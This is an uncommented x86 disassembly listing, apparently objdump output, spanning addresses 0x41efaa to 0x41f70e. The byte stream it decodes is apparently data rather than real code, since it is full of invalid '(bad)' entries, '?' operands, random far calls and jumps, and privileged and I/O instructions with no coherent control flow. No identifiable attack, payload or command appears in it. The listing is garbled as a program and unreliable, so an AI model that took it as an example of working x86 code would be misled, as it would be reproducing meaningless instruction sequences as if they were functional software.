  41efaa:	aaa    
  41efab:	dec    ebp
  41efac:	cli    
  41efad:	jp     0x41f026
  41efaf:	lea    edi,[edx-0x5f97ddc1]
  41efb5:	mov    bh,0xb7
  41efb7:	add    DWORD PTR [esp+eax*1-0x72f25586],0x53
  41efbf:	icebp  
  41efc0:	mov    WORD PTR [ebp-0x7819815a],fs
  41efc6:	stc    
  41efc7:	int3   
  41efc8:	dec    ebx
  41efc9:	in     eax,dx
  41efca:	test   DWORD PTR [edx],ecx
  41efcc:	push   es
  41efcd:	cmp    esi,DWORD PTR [eax-0x6af21b70]
  41efd3:	retf   
  41efd4:	push   edi
  41efd5:	add    edx,ecx
  41efd7:	xlat   BYTE PTR ds:[ebx]
  41efd8:	pop    ecx
  41efd9:	pop    ds
  41efda:	scas   al,BYTE PTR es:[edi]
  41efdb:	lds    edi,FWORD PTR ds:0x9fcac792
  41efe1:	lock outs dx,BYTE PTR ds:[esi]
  41efe3:	nop
  41efe4:	and    DWORD PTR [edi],edx
  41efe6:	or     al,0xf8
  41efe8:	lods   al,BYTE PTR ds:[esi]
  41efe9:	or     ebp,DWORD PTR [ecx-0x6d]
  41efec:	ds ins DWORD PTR es:[edi],dx
  41efee:	rol    DWORD PTR [ecx+0x6e41f7c0],cl
  41eff4:	jne    0x41f055
  41eff6:	xor    BYTE PTR [ebx-0x69],al
  41eff9:	aas    
  41effa:	push   es
  41effb:	push   ds
  41effc:	call   0xf9a5:0xe445a085
  41f003:	in     al,dx
  41f004:	jns    0x41f06d
  41f006:	or     al,0x35
  41f008:	inc    esp
  41f009:	stc    
  41f00a:	loope  0x41f07b
  41f00c:	in     al,dx
  41f00d:	and    ah,BYTE PTR [eax]
  41f00f:	jnp    0x41f078
  41f011:	mov    cl,0xf0
  41f013:	fnsave [edx]
  41f015:	pop    esp
  41f016:	mov    bl,0xeb
  41f018:	and    eax,0xb96a4062
  41f01d:	loopne 0x41efec
  41f01f:	sbb    ch,al
  41f021:	aaa    
  41f022:	in     al,0x11
  41f024:	inc    edi
  41f025:	or     dl,ch
  41f027:	(bad)  
  41f028:	stc    
  41f029:	stos   BYTE PTR es:[edi],al
  41f02a:	inc    ebx
  41f02b:	fld    DWORD PTR [edi-0x78]
  41f02e:	add    cl,BYTE PTR [eax+0x5f]
  41f031:	sti    
  41f032:	or     edx,DWORD PTR [eax+0xb]
  41f035:	cmp    BYTE PTR [esi],dh
  41f037:	enter  0x6754,0xb5
  41f03b:	je     0x41f03f
  41f03d:	mov    esp,0x6f2ad399
  41f042:	sbb    ebx,ecx
  41f044:	xchg   DWORD PTR [edx+0x59b5e2ce],ebx
  41f04a:	out    dx,al
  41f04b:	jle    0x41f0ad
  41f04d:	dec    ecx
  41f04e:	rcl    ch,cl
  41f050:	push   ds
  41f051:	jg     0x41f079
  41f053:	fidivr DWORD PTR [esi-0x1e]
  41f056:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41f058:	sbb    al,0x79
  41f05a:	adc    BYTE PTR [edx+esi*1],cl
  41f05d:	call   0xd711:0xa4f6e48
  41f064:	dec    eax
  41f065:	retf   0x5ea0
  41f068:	push   edx
  41f069:	imul   edi,DWORD PTR [ebp+0x72],0xffffffda
  41f06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f06e:	out    dx,al
  41f06f:	ss mov bh,0x34
  41f072:	popf   
  41f073:	leave  
  41f074:	xchg   edi,eax
  41f075:	jecxz  0x41f0e9
  41f077:	xchg   ebx,eax
  41f078:	mov    BYTE PTR [edx+0x60e37f01],0x4d
  41f07f:	inc    esp
  41f080:	mov    dh,0x9
  41f082:	retf   0x8e56
  41f085:	and    bl,BYTE PTR [edx]
  41f087:	pusha  
  41f088:	inc    ebx
  41f089:	bnd jae 0x41f020
  41f08c:	out    0x64,eax
  41f08e:	std    
  41f08f:	mov    al,0x6e
  41f091:	fst    DWORD PTR [eax+0x54844e3f]
  41f097:	cmp    ebx,ebp
  41f099:	xchg   DWORD PTR [edx+0x52382861],ecx
  41f09f:	or     edx,DWORD PTR [eax-0x30]
  41f0a2:	or     DWORD PTR [eax+0x18],edi
  41f0a5:	push   0xca0a2c07
  41f0aa:	dec    ecx
  41f0ab:	pop    es
  41f0ac:	adc    bh,BYTE PTR [ecx]
  41f0ae:	mov    dl,0xc6
  41f0b0:	out    dx,eax
  41f0b1:	sbb    bh,BYTE PTR [edx]
  41f0b3:	push   ecx
  41f0b4:	push   cs
  41f0b5:	mov    edi,0x1cd3e3f0
  41f0ba:	bound  ebp,QWORD PTR [esi]
  41f0bc:	cmc    
  41f0bd:	adc    BYTE PTR [edx+ebp*2-0x41],0xe5
  41f0c2:	mov    dl,0x4d
  41f0c4:	or     DWORD PTR [ecx+eiz*1],0xb6f69c1c
  41f0cb:	mov    eax,0xdae9a5a9
  41f0d0:	pop    ecx
  41f0d1:	mov    cl,0x4d
  41f0d3:	inc    eax
  41f0d4:	icebp  
  41f0d5:	cmp    eax,0x7bdd43bb
  41f0da:	(bad)  
  41f0db:	or     edi,DWORD PTR fs:[edx+ebp*4+0x3966eea9]
  41f0e3:	mov    esi,0x641a0753
  41f0e8:	rcr    DWORD PTR [ebx],cl
  41f0ea:	inc    esp
  41f0eb:	loopne 0x41f118
  41f0ed:	jo     0x41f0e8
  41f0ef:	jle    0x41f108
  41f0f1:	sti    
  41f0f2:	fld    TBYTE PTR [edi-0x6f]
  41f0f5:	lods   al,BYTE PTR ds:[esi]
  41f0f6:	into   
  41f0f7:	test   eax,0xa449ed06
  41f0fc:	jae    0x41f12c
  41f0fe:	jle    0x41f099
  41f100:	es int 0x64
  41f103:	in     al,dx
  41f104:	std    
  41f105:	mov    bl,0xc2
  41f107:	pop    esi
  41f108:	add    BYTE PTR gs:[ebx+eiz*8],bl
  41f10c:	push   eax
  41f10d:	push   0x1b
  41f10f:	xor    ah,dh
  41f111:	xor    al,0xfd
  41f113:	rol    BYTE PTR [ecx],cl
  41f115:	cmp    ebp,DWORD PTR [eax]
  41f117:	fsub   QWORD PTR [ecx-0x1f]
  41f11a:	push   ecx
  41f11b:	sti    
  41f11c:	loop   0x41f19d
  41f11e:	test   eax,0x73ee7202
  41f123:	sbb    ah,ch
  41f125:	loop   0x41f17b
  41f127:	push   esp
  41f128:	test   al,0x2f
  41f12a:	(bad)  
  41f12c:	gs push eax
  41f12e:	mov    cs,edx
  41f130:	sbb    ch,bl
  41f132:	loope  0x41f150
  41f134:	dec    ecx
  41f135:	xchg   esi,eax
  41f136:	leave  
  41f137:	outs   dx,DWORD PTR ds:[esi]
  41f138:	hlt    
  41f139:	pop    ebp
  41f13a:	aas    
  41f13b:	sbb    BYTE PTR [edi-0x3db24d41],ah
  41f141:	xchg   esp,eax
  41f142:	cmp    dh,BYTE PTR [edx]
  41f144:	fisub  WORD PTR [ecx+0x35]
  41f147:	jle    0x41f0ee
  41f149:	lahf   
  41f14a:	add    al,0xb4
  41f14c:	jmp    0x5900884a
  41f151:	div    BYTE PTR [ecx+0x75ba8ede]
  41f157:	aam    0xba
  41f159:	sub    eax,0x3e9de869
  41f15e:	xchg   ebp,eax
  41f15f:	jle    0x41f187
  41f161:	nop
  41f162:	ins    BYTE PTR es:[edi],dx
  41f163:	int    0x43
  41f165:	jle    0x41f143
  41f167:	push   eax
  41f168:	pop    ebp
  41f169:	dec    ebx
  41f16a:	mov    ah,0x76
  41f16c:	lock icebp 
  41f16e:	ds jmp 0x41f143
  41f171:	and    eax,0x1cbc0b09
  41f176:	not    ch
  41f178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f179:	(bad)  
  41f17a:	aam    0xba
  41f17c:	dec    edi
  41f17d:	inc    ebx
  41f17e:	leave  
  41f17f:	jo     0x41f200
  41f181:	mov    ch,0x3a
  41f183:	jmp    0x483bc33d
  41f188:	retf   
  41f189:	push   eax
  41f18a:	dec    edi
  41f18b:	iret   
  41f18c:	sbb    ch,BYTE PTR [eax]
  41f18e:	xchg   esp,eax
  41f18f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f190:	push   ebx
  41f191:	inc    edi
  41f192:	je     0x41f1e3
  41f194:	fbld   TBYTE PTR [ebx]
  41f196:	mov    eax,0xe01357ac
  41f19b:	sbb    BYTE PTR [edi],al
  41f19d:	sahf   
  41f19e:	xchg   ecx,eax
  41f19f:	jb     0x41f18f
  41f1a1:	dec    edx
  41f1a2:	ficom  WORD PTR [ebx]
  41f1a4:	or     cl,BYTE PTR [eax]
  41f1a6:	mov    eax,0xde1ed449
  41f1ab:	jb     0x41f1ee
  41f1ad:	mov    esi,0x95b90d25
  41f1b2:	stos   BYTE PTR es:[edi],al
  41f1b3:	ins    DWORD PTR es:[edi],dx
  41f1b4:	pusha  
  41f1b5:	mov    es,WORD PTR [edi]
  41f1b7:	sahf   
  41f1b8:	rcl    BYTE PTR [eax-0x42fe37e6],0x6b
  41f1bf:	push   0xc90bdc0
  41f1c4:	jmp    0x7200e840
  41f1c9:	and    DWORD PTR [ebp+ecx*8+0x30],esi
  41f1cd:	inc    ecx
  41f1ce:	mov    eax,ds:0x7a83c2a6
  41f1d3:	and    DWORD PTR [esi],esi
  41f1d5:	ret    
  41f1d6:	test   BYTE PTR [edx],dl
  41f1d8:	or     al,0x51
  41f1da:	lods   eax,DWORD PTR ds:[esi]
  41f1db:	adc    dh,0x59
  41f1de:	call   0x4c477ac3
  41f1e3:	mov    WORD PTR [esi-0x3d],?
  41f1e6:	ja     0x41f170
  41f1e8:	inc    ebx
  41f1e9:	jbe    0x41f210
  41f1eb:	or     al,0x86
  41f1ed:	pop    ss
  41f1ee:	mov    ds:0xd2ff31d1,al
  41f1f3:	mov    DWORD PTR [ebx+0xe025121],0xb4ca66e3
  41f1fd:	add    dh,BYTE PTR [esi+edi*1-0x127a83aa]
  41f204:	ins    BYTE PTR es:[edi],dx
  41f205:	xor    eax,0x85315af5
  41f20a:	mov    ?,esi
  41f20c:	scas   eax,DWORD PTR es:[edi]
  41f20d:	iret   
  41f20e:	mov    cs,eax
  41f210:	(bad)  
  41f211:	hlt    
  41f212:	aaa    
  41f213:	stos   DWORD PTR es:[edi],eax
  41f214:	cmc    
  41f215:	js     0x41f200
  41f217:	jmp    0x41f1ea
  41f219:	les    edi,FWORD PTR ds:0xfde91e4c
  41f21f:	cdq    
  41f220:	adc    BYTE PTR [edi+0x33],bh
  41f223:	fisttp QWORD PTR [edx+0x48]
  41f226:	int    0x8a
  41f228:	cld    
  41f229:	cmovb  esp,DWORD PTR [edi]
  41f22c:	inc    ebx
  41f22d:	cli    
  41f22e:	nop
  41f22f:	fcom   DWORD PTR [esi-0x78]
  41f232:	out    dx,al
  41f233:	scas   eax,DWORD PTR es:[edi]
  41f234:	and    esp,DWORD PTR gs:[ecx+0x224b4f2f]
  41f23b:	push   edi
  41f23c:	into   
  41f23d:	test   DWORD PTR [ecx+0x50],0x7927126
	...
  41f250:	add    BYTE PTR [eax],dh
  41f252:	ret    0xe921
  41f255:	repz jmp 0x41f250
  41f258:	fcmovnb st,st(3)
  41f25a:	pop    ebp
  41f25b:	sbb    DWORD PTR [ecx+0x5f],ebx
  41f25e:	adc    eax,0x6d171ba3
  41f263:	add    DWORD PTR [eax],eax
  41f265:	stos   DWORD PTR es:[edi],eax
  41f266:	add    eax,DWORD PTR [eax]
  41f268:	add    BYTE PTR [edi-0x2e022631],bl
  41f26e:	imul   ecx,DWORD PTR [edx+0x34],0x3a
  41f272:	sbb    DWORD PTR [esi-0x73ad9d71],eax
  41f278:	mov    ecx,0x6a3d7e12
  41f27d:	jae    0x41f226
  41f27f:	mov    edi,0x1198cea5
  41f284:	repnz sbb dl,bl
  41f287:	or     ecx,DWORD PTR [esi-0x31]
  41f28a:	ja     0x41f2ef
  41f28c:	fidiv  DWORD PTR [ecx-0x236e5881]
  41f292:	into   
  41f293:	sbb    eax,0x6d6b97
  41f298:	and    ch,dl
  41f29a:	dec    ebx
  41f29b:	dec    ebp
  41f29c:	scas   al,BYTE PTR es:[edi]
  41f29d:	cmc    
  41f29e:	mov    cl,0x7d
  41f2a0:	jnp    0x41f23f
  41f2a2:	and    cl,BYTE PTR [edx+0x1b035a70]
  41f2a8:	imul   eax,DWORD PTR [edx],0x65ad63c5
  41f2ae:	imul   ebx,edi,0xbdc9058b
  41f2b4:	pop    esp
  41f2b5:	(bad)  
  41f2b6:	mov    al,ds:0x30d6e968
  41f2bb:	fstp   TBYTE PTR [edi+0x51]
  41f2be:	push   esp
  41f2bf:	push   esp
  41f2c0:	loop   0x41f2d0
  41f2c2:	in     eax,0x8f
  41f2c4:	loopne 0x41f344
  41f2c6:	fisttp QWORD PTR [edx-0x22570bf4]
  41f2cc:	int3   
  41f2cd:	dec    esp
  41f2ce:	cmp    BYTE PTR [ecx+0x7814317],ah
  41f2d4:	je     0x41f323
  41f2d6:	int3   
  41f2d7:	imul   esi,DWORD PTR [ebx],0x7373e38
  41f2dd:	sbb    esp,edx
  41f2df:	repz sti 
  41f2e1:	jbe    0x41f315
  41f2e3:	cmp    eax,DWORD PTR [ecx+0x39]
  41f2e6:	inc    esp
  41f2e7:	dec    esi
  41f2e8:	scas   al,BYTE PTR es:[edi]
  41f2e9:	lahf   
  41f2ea:	in     al,0x4e
  41f2ec:	inc    ebp
  41f2ed:	mov    bh,0xb
  41f2ef:	stc    
  41f2f0:	cmp    esi,edx
  41f2f2:	or     DWORD PTR [ebx+0x17],esi
  41f2f5:	in     eax,dx
  41f2f6:	jg     0x41f2cc
  41f2f8:	ds out dx,eax
  41f2fa:	pusha  
  41f2fb:	and    DWORD PTR [eax],esi
  41f2fd:	inc    ebx
  41f2fe:	cmp    BYTE PTR [esi],dh
  41f300:	clc    
  41f301:	sbb    ebp,esi
  41f303:	or     dh,cl
  41f305:	inc    eax
  41f306:	or     al,BYTE PTR ds:0xdc026c93
  41f30c:	xchg   esi,eax
  41f30d:	mov    ch,0xa2
  41f30f:	call   0x985a:0xa61ced32
  41f316:	mov    esp,0x96aa5c20
  41f31b:	adc    ch,bl
  41f31d:	push   ebx
  41f31e:	xchg   cl,cl
  41f320:	daa    
  41f321:	jne    0x41f2a4
  41f323:	adc    BYTE PTR [eax-0xe],dl
  41f326:	fidivr WORD PTR [ebx-0x15]
  41f329:	push   es
  41f32a:	add    DWORD PTR [ebx+0x13],ebx
  41f32d:	out    0xa2,eax
  41f32f:	cmp    DWORD PTR [edi],esp
  41f331:	pop    edi
  41f332:	add    eax,0x75cb6257
  41f337:	scas   eax,DWORD PTR es:[edi]
  41f338:	les    edi,FWORD PTR [ebx-0x4ea6647]
  41f33e:	mov    al,0xa5
  41f340:	fucomip st,st(7)
  41f342:	test   BYTE PTR [ecx+ebp*4-0x19],ch
  41f346:	add    BYTE PTR [edi-0x5d65acaa],0x9b
  41f34d:	daa    
  41f34e:	and    eax,0x826fcba8
  41f353:	cmp    BYTE PTR [edi+ebx*2-0x43],al
  41f357:	lea    edx,[edi]
  41f359:	test   al,0xb3
  41f35b:	push   eax
  41f35c:	jae    0x41f3bd
  41f35e:	and    DWORD PTR [eax-0x4d8cbd30],ebx
  41f364:	loope  0x41f355
  41f366:	and    DWORD PTR [edx+eiz*8-0x76a80476],edi
  41f36d:	mov    ch,0x4
  41f36f:	jmp    0x41f39e
  41f371:	ins    DWORD PTR es:[edi],dx
  41f372:	push   esi
  41f373:	lds    ebx,FWORD PTR [ebp+0x1461849b]
  41f379:	lahf   
  41f37a:	popa   
  41f37b:	cmc    
  41f37c:	in     eax,dx
  41f37d:	mov    BYTE PTR [ecx+eiz*8],dh
  41f380:	pusha  
  41f381:	(bad)  
  41f382:	fs popa 
  41f384:	enter  0x7f66,0x4d
  41f388:	xor    cl,BYTE PTR [edi-0x66]
  41f38b:	gs push edx
  41f38d:	push   ss
  41f38e:	xchg   ecx,eax
  41f38f:	aad    0xa5
  41f391:	pop    esi
  41f392:	test   al,0x51
  41f394:	mov    eax,ds:0x9d4ec044
  41f399:	dec    eax
  41f39a:	jp     0x41f3e2
  41f39c:	jge    0x41f33f
  41f39e:	mov    eax,ds:0xcee7fdfd
  41f3a3:	iret   
  41f3a4:	ret    0xc674
  41f3a7:	bound  edi,QWORD PTR [edx+0x1cf0bf8d]
  41f3ad:	nop
  41f3ae:	call   0xe14d:0xfce1f573
  41f3b5:	imul   ebx,DWORD PTR [eax],0x619ce1eb
  41f3bb:	xor    cl,ah
  41f3bd:	aam    0x13
  41f3bf:	mov    al,ds:0xf84cd94d
  41f3c4:	xor    BYTE PTR [esi+0x19b5e115],bh
  41f3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3cb:	mov    ?,WORD PTR [ecx+0x1]
  41f3ce:	and    edx,0xffffff91
  41f3d1:	leave  
  41f3d2:	sub    BYTE PTR [eax+0x77],dh
  41f3d5:	push   esi
  41f3d6:	dec    edi
  41f3d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3d8:	inc    ebx
  41f3d9:	sub    BYTE PTR [eax-0x51],ah
  41f3dc:	or     ah,ah
  41f3de:	ds arpl cx,cx
  41f3e1:	add    eax,0x29c74584
  41f3e6:	mov    BYTE PTR [ebp-0x47],ah
  41f3e9:	mov    WORD PTR [esi-0x3b0ceaa4],ds
  41f3ef:	mov    WORD PTR [ebx],ds
  41f3f1:	inc    ebp
  41f3f2:	and    bl,BYTE PTR [esi-0x399eba3e]
  41f3f8:	aaa    
  41f3f9:	mov    bh,0x12
  41f3fb:	ffreep st(6)
  41f3fd:	lods   al,BYTE PTR ds:[esi]
  41f3fe:	push   edi
  41f3ff:	xor    eax,0xbd6ad69e
  41f404:	in     eax,0xee
  41f406:	fwait
  41f407:	inc    edx
  41f408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f409:	cmp    DWORD PTR [ecx+esi*4-0x3f29dece],eax
  41f410:	push   esp
  41f411:	xor    edx,esp
  41f413:	xchg   DWORD PTR [eax+0x4c],ebx
  41f416:	lods   eax,DWORD PTR ds:[esi]
  41f417:	inc    ecx
  41f418:	loop   0x41f45b
  41f41a:	push   edi
  41f41b:	jp     0x41f472
  41f41d:	lahf   
  41f41e:	lahf   
  41f41f:	push   ebx
  41f420:	rcr    DWORD PTR [esi-0x726d3325],0x3d
  41f427:	int3   
  41f428:	lock jp 0x41f3c6
  41f42b:	loop   0x41f3b7
  41f42d:	jmp    0x1c6e:0x61f02c8a
  41f434:	fisub  DWORD PTR [ecx]
  41f436:	dec    ebx
  41f437:	mov    cl,BYTE PTR [ebp+0xb]
  41f43a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f43b:	dec    edx
  41f43c:	pop    edx
  41f43d:	inc    ebp
  41f43e:	cwde   
  41f43f:	mov    al,BYTE PTR [ecx+0x7aa78743]
  41f445:	fdivrp st(1),st
  41f447:	jl     0x41f3fa
  41f449:	sbb    al,0x45
  41f44b:	cld    
  41f44c:	pop    ds
  41f44d:	test   BYTE PTR [esi-0x11],0x45
  41f451:	mov    dl,0x5e
  41f453:	fwait
  41f454:	icebp  
  41f455:	push   edi
  41f456:	xchg   esp,eax
  41f457:	sti    
  41f458:	sahf   
  41f459:	repz mov dh,0xb4
  41f45c:	inc    ebx
  41f45d:	pop    ecx
  41f45e:	dec    esp
  41f45f:	dec    esi
  41f460:	jne    0x41f4bc
  41f462:	jbe    0x7cf1dcc1
  41f468:	cdq    
  41f469:	pop    ebp
  41f46a:	pop    edi
  41f46b:	push   edx
  41f46c:	stc    
  41f46d:	push   ebx
  41f46e:	jno    0x41f49f
  41f470:	xchg   DWORD PTR [edi+edi*2+0x164aa3f6],edi
  41f477:	add    dl,BYTE PTR [ebp-0x1f]
  41f47a:	sub    ah,BYTE PTR [eax+0x4]
  41f47d:	ja     0x41f4d6
  41f47f:	push   0xfcd5ab89
  41f484:	cld    
  41f485:	test   BYTE PTR [edi+0x1f],dl
  41f488:	lods   eax,DWORD PTR ds:[esi]
  41f489:	mov    al,0xa7
  41f48b:	shl    DWORD PTR [ebp+eiz*2-0x2b],1
  41f48f:	data16 jne 0x41f41a
  41f492:	and    eax,0x16cf2089
  41f497:	fs dec ebp
  41f499:	lds    edi,FWORD PTR [eax-0x4c193f02]
  41f49f:	sti    
  41f4a0:	mov    eax,0xaa9fc86f
  41f4a5:	mov    dl,0xc9
  41f4a7:	jmp    0x41f44a
  41f4a9:	pop    eax
  41f4aa:	je     0x41f51c
  41f4ac:	les    esi,FWORD PTR [esi]
  41f4ae:	pop    ebx
  41f4af:	fdiv   st,st(5)
  41f4b1:	retf   
  41f4b2:	jo     0x41f4a4
  41f4b4:	push   eax
  41f4b5:	std    
  41f4b6:	sbb    al,0x6c
  41f4b8:	fcmovbe st,st(6)
  41f4ba:	imul   eax,DWORD PTR [ebx+edx*4-0x5cdeef43],0xffffffc2
  41f4c2:	inc    eax
  41f4c4:	mov    ah,0xe3
  41f4c6:	mov    cl,0x4c
  41f4c8:	cmp    bh,BYTE PTR [ecx-0x6d]
  41f4cb:	ret    0xad28
  41f4ce:	out    dx,al
  41f4cf:	stos   BYTE PTR es:[edi],al
  41f4d0:	lods   eax,DWORD PTR ds:[esi]
  41f4d1:	out    0x76,al
  41f4d3:	das    
  41f4d4:	mov    al,BYTE PTR [edx]
  41f4d6:	retf   0x1028
  41f4d9:	stos   DWORD PTR es:[edi],eax
  41f4da:	repz mov bh,0xda
  41f4dd:	test   bh,0x10
  41f4e0:	retf   0x87ad
  41f4e3:	jae    0x41f481
  41f4e5:	add    eax,0x1d050462
  41f4ea:	push   esp
  41f4eb:	ret    0xdd99
  41f4ee:	ins    DWORD PTR es:[edi],dx
  41f4ef:	ins    BYTE PTR es:[edi],dx
  41f4f0:	cdq    
  41f4f1:	mov    gs,WORD PTR [edi]
  41f4f3:	fsubr  DWORD PTR ds:0x5ce9aa4b
  41f4f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4fa:	fsubr  QWORD PTR [edx]
  41f4fc:	clc    
  41f4fd:	fist   DWORD PTR ds:0x3813b9c6
  41f503:	push   edx
  41f504:	and    ecx,DWORD PTR [ebx]
  41f506:	cmc    
  41f507:	shr    DWORD PTR [ebx-0x3fba843],1
  41f50d:	icebp  
  41f50e:	ds dec ecx
  41f510:	cmp    DWORD PTR [esp+eiz*8-0x35a4ffee],ebp
  41f517:	sub    ecx,ebp
  41f519:	cmp    DWORD PTR [esi-0x6e],ecx
  41f51c:	fbstp  TBYTE PTR [esi+0x569c4ac6]
  41f522:	or     eax,0x998efc4d
  41f527:	shl    ch,1
  41f529:	bound  edi,QWORD PTR [ebp+ebp*1+0x7c2d69db]
  41f530:	dec    edi
  41f531:	push   es
  41f532:	xchg   edx,eax
  41f533:	xchg   dh,al
  41f535:	sbb    eax,0xe9d497eb
  41f53a:	test   eax,0x88f56d69
  41f53f:	mov    DWORD PTR [esi+0x70],esi
  41f542:	xor    BYTE PTR [eax-0x13],bl
  41f545:	pop    eax
  41f546:	dec    ebx
  41f547:	pop    ds
  41f548:	pushf  
  41f549:	imul   esi,DWORD PTR [eax+edi*1-0x43c61a16],0xe76d6c5f
  41f554:	mov    ds:0x85acdd58,eax
  41f559:	adc    eax,0xae24ca16
  41f55e:	push   0x4992c408
  41f563:	test   DWORD PTR [edx-0x44],ebp
  41f566:	xor    al,0xb1
  41f568:	ror    BYTE PTR [ebx+0x1fcaf574],1
  41f56e:	mov    ds:0x47f45617,al
  41f573:	mov    al,0x86
  41f575:	mov    al,ds:0x73e7c351
  41f57a:	dec    esp
  41f57b:	jmp    0x41f57f
  41f57d:	(bad)  
  41f57e:	int    0xb5
  41f580:	enter  0xd4ca,0x1
  41f584:	fisubr WORD PTR ds:0x8b2bd990
  41f58a:	adc    edi,edi
  41f58c:	js     0x41f5b2
  41f58e:	addr16 mov ds:0x5af3,eax
  41f592:	test   DWORD PTR ds:0xc65e6ebe,ebx
  41f598:	and    eax,0xdbd77ae0
  41f59d:	hlt    
  41f59e:	add    DWORD PTR [ebx],edi
  41f5a0:	inc    esi
  41f5a1:	cdq    
  41f5a2:	imul   esi,esi,0x1f
  41f5a5:	loop   0x41f52a
  41f5a7:	push   ecx
  41f5a8:	dec    esp
  41f5a9:	cmp    ebx,DWORD PTR [edx-0x2eaa7ac4]
  41f5af:	jmp    0x41f610
  41f5b1:	cmp    dh,BYTE PTR [edx]
  41f5b3:	scas   eax,DWORD PTR es:[edi]
  41f5b4:	sub    eax,0xe430c775
  41f5b9:	jnp    0x41f555
  41f5bb:	pushf  
  41f5bc:	(bad)  
  41f5bd:	aaa    
  41f5be:	and    dl,BYTE PTR [ecx-0x75]
  41f5c1:	test   BYTE PTR [esi],dl
  41f5c3:	or     DWORD PTR [edx-0x14],edi
  41f5c6:	(bad)  
  41f5c7:	js     0x41f60f
  41f5c9:	jle    0x41f57f
  41f5cb:	scas   al,BYTE PTR es:[edi]
  41f5cc:	fcom   QWORD PTR [ecx-0x860b24]
  41f5d2:	xor    al,0xa9
  41f5d4:	push   eax
  41f5d5:	inc    esi
  41f5d6:	out    0x5e,al
  41f5d8:	push   ebp
  41f5d9:	adc    al,0x20
  41f5db:	lahf   
  41f5dc:	jno    0x41f5b6
  41f5de:	test   BYTE PTR [ebx-0x53eb5091],dl
  41f5e4:	in     eax,0x5d
  41f5e6:	adc    ecx,ebp
  41f5e8:	inc    ecx
  41f5e9:	add    eax,0x2582e58b
  41f5ee:	out    0x48,eax
  41f5f0:	icebp  
  41f5f1:	push   esi
  41f5f2:	rol    DWORD PTR [ecx+0x7e],1
  41f5f5:	sub    bl,BYTE PTR [eax-0x6411b13a]
  41f5fb:	jno    0x41f5e9
  41f5fd:	imul   ebx,DWORD PTR [ebx],0xb9322385
  41f603:	jb     0x41f5fe
  41f605:	xor    ecx,edx
  41f607:	dec    ecx
  41f608:	add    edi,DWORD PTR [esi]
  41f60a:	mov    edx,DWORD PTR [ebx]
  41f60c:	xchg   BYTE PTR [ecx-0x74],bh
  41f60f:	mov    ebx,0xbe9fcef3
	...
  41f620:	add    BYTE PTR [edx+0x5],al
  41f623:	and    BYTE PTR [eax+0x67],ah
  41f626:	gs inc edx
  41f628:	daa    
  41f629:	sti    
  41f62a:	mov    ch,0xb1
  41f62c:	push   edx
  41f62d:	mov    ah,dl
  41f62f:	call   0x1b2b883
  41f634:	add    BYTE PTR [ebx+0x5a000003],ch
  41f63a:	mov    al,ds:0x778053e6
  41f63f:	inc    esi
  41f640:	jbe    0x41f61d
  41f642:	push   ecx
  41f643:	sti    
  41f644:	rcr    DWORD PTR [ebx-0x45],0x43
  41f648:	rdmsr  
  41f64a:	ins    BYTE PTR es:[edi],dx
  41f64b:	jge    0x41f6a6
  41f64d:	stc    
  41f64e:	jle    0x41f652
  41f650:	pop    es
  41f651:	pushf  
  41f652:	push   ss
  41f653:	mov    dl,0x41
  41f655:	inc    edx
  41f656:	repnz mov edi,0x7ac93f8f
  41f65c:	dec    DWORD PTR [edi-0x2db9e624]
  41f662:	call   0x7989816c
  41f667:	and    dh,ah
  41f669:	imul   esi,DWORD PTR [eax+0xd],0xffffff93
  41f66d:	dec    edx
  41f66e:	jo     0x41f6d9
  41f670:	mov    cl,0x38
  41f672:	or     dh,ch
  41f674:	cld    
  41f675:	dec    eax
  41f676:	int    0x8
  41f678:	push   esp
  41f679:	jge    0x41f64f
  41f67b:	stos   BYTE PTR es:[edi],al
  41f67c:	sbb    ch,bh
  41f67e:	outs   dx,DWORD PTR ds:[esi]
  41f67f:	xor    eax,0x986266e8
  41f684:	mov    cl,0x3
  41f686:	out    0x47,eax
  41f688:	mov    eax,ds:0x96119417
  41f68d:	cmp    DWORD PTR [eax-0x5f4804e2],eax
  41f693:	sbb    BYTE PTR [eax+0x2f],cl
  41f696:	lods   al,BYTE PTR ds:[esi]
  41f697:	fwait
  41f698:	add    BYTE PTR [edi],0x3
  41f69b:	push   ebp
  41f69c:	lock inc ebx
  41f69e:	jbe    0x41f709
  41f6a0:	mov    bl,0x21
  41f6a2:	fmulp  st(3),st
  41f6a4:	mov    cl,0xc4
  41f6a6:	mov    bl,BYTE PTR [ecx+ebp*1]
  41f6a9:	and    al,0x8e
  41f6ab:	lahf   
  41f6ac:	mov    edi,0x173f46f2
  41f6b1:	sub    bl,BYTE PTR [edi+0x2]
  41f6b4:	stos   DWORD PTR es:[edi],eax
  41f6b5:	sub    al,0x1
  41f6b7:	ins    BYTE PTR es:[edi],dx
  41f6b8:	add    eax,0x599d7ed4
  41f6bd:	xchg   edx,eax
  41f6be:	sub    bh,BYTE PTR [eax+0x34bc62fd]
  41f6c4:	mov    BYTE PTR [eax],dh
  41f6c6:	shl    bh,1
  41f6c8:	fiadd  WORD PTR [ecx]
  41f6ca:	neg    BYTE PTR [ebx-0x43]
  41f6cd:	add    DWORD PTR [eax],ebx
  41f6cf:	pop    edx
  41f6d0:	mov    ecx,0x3769ce49
  41f6d5:	(bad)  
  41f6d6:	adc    al,0x91
  41f6d8:	imul   esi,DWORD PTR [ecx+ecx*4-0x75],0xffffffab
  41f6dd:	repnz sub eax,0xe10fbabf
  41f6e3:	cmp    ah,BYTE PTR [eax+edi*4+0x37ef6ef]
  41f6ea:	mov    ds:0x5a5708bf,al
  41f6ef:	sbb    al,0xf9
  41f6f1:	mov    ebx,0xfdcf0b3b
  41f6f6:	outs   dx,DWORD PTR ds:[esi]
  41f6f7:	call   0x61603ed1
  41f6fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6fd:	dec    ecx
  41f6fe:	pop    ecx
  41f6ff:	aad    0xa2
  41f701:	jmp    0xf84f:0x1165ab76
  41f708:	(bad)
  41f70b:	inc    esi
  41f70c:	aam    0x67
  41f70e:	sub    eax,0x526a3261
